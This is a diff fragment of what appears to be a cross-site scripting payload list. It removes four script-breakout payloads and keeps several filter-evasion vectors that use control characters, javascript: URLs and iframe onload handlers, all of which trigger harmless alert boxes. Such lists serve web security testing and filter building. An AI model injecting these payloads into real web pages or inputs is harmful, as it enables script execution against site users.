@@ -24,10 +24,7 @@ http://66.102.7.147/">XSS
 <IMG SRC=" &#14;  javascript:alert('XSS');">
 <DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
 <iframe<?php echo chr(11)?> onload=alert('XSS')></iframe>
-<script>alert("XSS by \nxss")</script><marquee><h1>XSS by xss</h1></marquee>
-"><script>alert("XSS by \nxss")</script>><marquee><h1>XSS by xss</h1></marquee>
-'"></title><script>alert("XSS by \nxss")</script>><marquee><h1>XSS by xss</h1></marquee>
-<img """><script>alert("XSS by \nxss")</script><marquee><h1>XSS by xss</h1></marquee>
+
 
 
 <iframe src="javascript:alert('XSS by \nxss');"></iframe><marquee><h1>XSS by xss</h1></marquee>
